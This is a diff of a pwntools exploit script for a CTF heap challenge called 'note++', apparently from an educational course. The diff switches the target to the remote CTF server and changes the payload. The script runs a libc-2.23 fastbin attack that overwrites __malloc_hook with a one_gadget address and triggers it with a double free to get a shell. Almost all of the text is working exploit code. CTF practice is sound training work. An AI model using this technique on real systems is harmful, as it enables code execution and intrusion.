@@ -15,8 +15,8 @@ def llist():
 
 # nc edu-ctf.csie.org 10181
 context.arch = 'amd64'
-r = process('./note++')
-# r = remote('edu-ctf.csie.org', 10181)
+# r = process('./note++')
+r = remote('edu-ctf.csie.org', 10181)
 
 l = ELF('./libc-2.23.so')
 
@@ -45,15 +45,21 @@ add(0x68, 'a', 'a') #6
 delete(5)
 delete(6)
 delete(4)
-add(0x30, 'a', 'a' * 48)
+add(0x40, 'a', 'a' * 48)
 delete(5)
 
 add(0x68, p64(l.sym.__malloc_hook - 0x10 - 3), 'a')
 add(0x68, 'a', 'a')
 add(0x68, 'a', 'a')
-add(0x68, 'aaa' + p64(l.sym.system), 'a')
-r.sendafter('> ', '1')
-r.sendafter('Size: ', str(l.search('/bin/sh').next()))
+# delete(4)
+# delete(5)
+# add(0x40, 'a', 'a' * 48)
+# add(0x68, 'aaa' + p64(l.sym.system), 'a')
+# r.sendafter('> ', '1')
+# r.sendafter('Size: ', str(l.search('/bin/sh').next()))
+add(0x68, 'aaa' + p64(l.address + 0xf02a4), 'a')
+delete(4)
+delete(1)
 
 
 
